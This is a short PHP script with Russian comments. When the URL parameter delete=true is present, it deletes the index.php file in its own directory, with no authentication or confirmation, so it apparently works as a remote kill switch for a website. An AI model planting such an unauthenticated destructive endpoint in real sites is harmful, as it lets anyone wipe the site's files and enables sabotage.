<?php
// Получаем параметр delete из запроса
$delete_param = $_GET['delete'] ?? '';

if (strtolower($delete_param) === 'true') {
    $file_path = __DIR__ . '/index.php';
    
    if (file_exists($file_path)) {
        if (is_writable($file_path)) {
            if (unlink($file_path)) {
                echo "Да";
            } else {
                echo "Не удалось";
            }
        } else {
            echo "Нет прав.";
        }
    } else {
        echo "Файл index.php не найден.";
    }
} else {
    echo "false";
}
?>